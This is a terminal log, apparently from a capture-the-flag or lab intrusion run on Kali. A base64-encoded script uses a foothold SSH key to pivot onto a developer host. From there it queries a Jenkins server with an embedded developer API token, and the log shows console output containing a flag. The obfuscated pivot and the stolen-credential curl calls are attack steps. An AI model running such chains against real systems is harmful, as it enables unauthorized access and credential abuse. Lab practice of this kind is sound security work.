@@ -1,0 +1,95 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k08jenkins.sh <<'B64EOF'
+> Y2F0ID4gL3RtcC9yZW1vdGVfazA4X2plbmtpbnMuc2ggPDwnUkVNT1RFJwpDQT0vaG9tZS9yb3dhbi8ubG9jYWwvc2hhcmUva2VwbGVyb3BzL2NhLmNydApVPXJvd2FuLml0bzpma19kZXZlbG9wZXJfeVVXVEtTcXJjMTZ5M0s1XzVEZlE3cWFjZnQ5Yi05eG8KSj1odHRwczovL2NpLmtlcGxlcm9wcy50ZXN0CmVjaG8gIj09PSBidWlsZCAxODQyIGFwaSA9PT0iCmN1cmwgLXNTIC0tY2FjZXJ0ICRDQSAtdSAiJFUiICIkSi9qb2IvZmllbGRsaW5rLXJlcG9ydC8xODQyL2FwaS9qc29uP3RyZWU9bnVtYmVyLHJlc3VsdCxkZXNjcmlwdGlvbixhcnRpZmFjdHNbZmlsZU5hbWUscmVsYXRpdmVQYXRoXSxhY3Rpb25zW3BhcmFtZXRlcnNbbmFtZSx2YWx1ZV1dLGNoYW5nZVNldFtpdGVtc1ttc2ddXSIgfCBoZWFkIC1jIDQwMDA7IGVjaG8KZWNobyAiPT09IGNvbnNvbGUgPT09IgpjdXJsIC1zUyAtLWNhY2VydCAkQ0EgLXUgIiRVIiAiJEovam9iL2ZpZWxkbGluay1yZXBvcnQvMTg0Mi9jb25zb2xlVGV4dCIgfCBoZWFkIC1jIDQwMDA7IGVjaG8KZWNobyAiPT09IGpvYiBhcGkgPT09IgpjdXJsIC1zUyAtLWNhY2VydCAkQ0EgLXUgIiRVIiAiJEovam9iL2ZpZWxkbGluay1yZXBvcnQvYXBpL2pzb24/dHJlZT1idWlsZHNbbnVtYmVyXSxuYW1lIiB8IGhlYWQgLWMgMjAwMDsgZWNobwplY2hvICI9PT0gcmV2aWV3IGpvYiBhcGkgPT09IgpjdXJsIC1zUyAtLWNhY2VydCAkQ0EgLXUgIiRVIiAiJEovam9iL2ZpZWxkbGluay1yZXBvcnQtcmV2aWV3L2FwaS9qc29uP3RyZWU9YnVpbGRzW251bWJlcl0sbmFtZSIgfCBoZWFkIC1jIDIwMDA7IGVjaG8KUkVNT1RFCnRpbWVvdXQgMTIwIHNzaCAtbyBTdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW8gQ29ubmVjdFRpbWVvdXQ9MTAgLWkgfi8uc3NoL2tlcGxlcm9wcy1mb290aG9sZCAtcCAyMjIyIHJvd2FuQHJvd2FuLWRldiAnYmFzaCAtcycgPCAvdG1wL3JlbW90ZV9rMDhfamVua2lucy5zaAo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k08jenkins.sh; bash /tmp/k08jenkins.sh; echo DONEMARK_1795208824394$((6*7))
+=== build 1842 api ===
+curl: (3) bad range in URL position 103:
+https://ci.keplerops.test/job/fieldlink-report/1842/api/json?tree=number,result,description,artifacts[fileName,relativePath],actions[parameters[name,value]],changeSet[items[msg]]
+                                                                                                      ^
+
+=== console ===
+Legacy code started this job.  No cause information is available
+Running as SYSTEM
+Building in workspace /var/jenkins_home/workspace/fieldlink-report
+The recommended git tool is: NONE
+using credential fieldlink-source-read
+Cloning the remote Git repository
+Cloning repository https://source.keplerops.test/fieldkest/fieldlink-connector.git
+ > git init /var/jenkins_home/workspace/fieldlink-report # timeout=10
+Fetching upstream changes from https://source.keplerops.test/fieldkest/fieldlink-connector.git
+ > git --version # timeout=10
+ > git --version # 'git version 2.47.3'
+using GIT_ASKPASS to set credentials FieldLink source read access
+ > git fetch --tags --force --progress -- https://source.keplerops.test/fieldkest/fieldlink-connector.git +refs/heads/*:refs/remotes/origin/* # timeout=10
+ > git config remote.origin.url https://source.keplerops.test/fieldkest/fieldlink-connector.git # timeout=10
+ > git config --add remote.origin.fetch +refs/heads/*:refs/remotes/origin/* # timeout=10
+Avoid second fetch
+ > git rev-parse refs/remotes/origin/main^{commit} # timeout=10
+Checking out Revision c37effd7cc86ae4d44f18e95f899b7557d65e0a9 (refs/remotes/origin/main)
+ > git config core.sparsecheckout # timeout=10
+ > git checkout -f c37effd7cc86ae4d44f18e95f899b7557d65e0a9 # timeout=10
+Commit message: "remove generated report fixture from tree"
+First time build. Skipping changelog.
+[fieldlink-report] $ /bin/sh /tmp/jenkins12225128642379901870.sh
+fixture provenance: fk-test-6d1e9f7
+fixture path: fixtures/report-crr-og2.json
+============================= test session starts ==============================
+platform linux -- Python 3.13.5, pytest-8.3.5, pluggy-1.5.0 -- /usr/bin/python3
+cachedir: .pytest_cache
+rootdir: /var/jenkins_home/workspace/fieldlink-report
+collecting ... collected 1 item
+
+tests/test_crr_og2_report.py::test_report_fixture FAILED                 [100%]
+
+=================================== FAILURES ===================================
+_____________________________ test_report_fixture ______________________________
+
+    def test_report_fixture():
+>       report = json.loads(Path('fixtures/report-crr-og2.json').read_text())
+
+tests/test_crr_og2_report.py:5: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/usr/lib/python3.13/pathlib/_local.py:548: in read_text
+    return PathBase.read_text(self, encoding, errors, newline)
+/usr/lib/python3.13/pathlib/_abc.py:632: in read_text
+    with self.open(mode='r', encoding=encoding, errors=errors, newline=newline) as f:
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+self = PosixPath('fixtures/report-crr-og2.json'), mode = 'r', buffering = -1
+encoding = 'locale', errors = None, newline = None
+
+    def open(self, mode='r', buffering=-1, encoding=None,
+             errors=None, newline=None):
+        """
+        Open the file pointed to by this path and return a file object, as
+        the built-in open() function does.
+        """
+        if "b" not in mode:
+            encoding = io.text_encoding(encoding)
+>       return io.open(self, mode, buffering, encoding, errors, newline)
+E       FileNotFoundError: [Errno 2] No such file or directory: 'fixtures/report-crr-og2.json'
+
+/usr/lib/python3.13/pathlib/_local.py:539: FileNotFoundError
+=========================== short test summary info ============================
+FAILED tests/test_crr_og2_report.py::test_report_fixture - FileNotFoundError: [Errno 2] No such file or directory: 'fixtures/report-crr-og2.json'
+============================== 1 failed in 0.06s ===============================
+FLAG{7db9f86b38c288ab}
+Build step 'Execute shell' marked build as failure
+Archiving artifacts
+Finished: FAILURE
+
+=== job api ===
+curl: (3) bad range in URL position 69:
+https://ci.keplerops.test/job/fieldlink-report/api/json?tree=builds[number],name
+                                                                    ^
+
+=== review job api ===
+curl: (3) bad range in URL position 76:
+https://ci.keplerops.test/job/fieldlink-report-review/api/json?tree=builds[number],name
+                                                                           ^
+
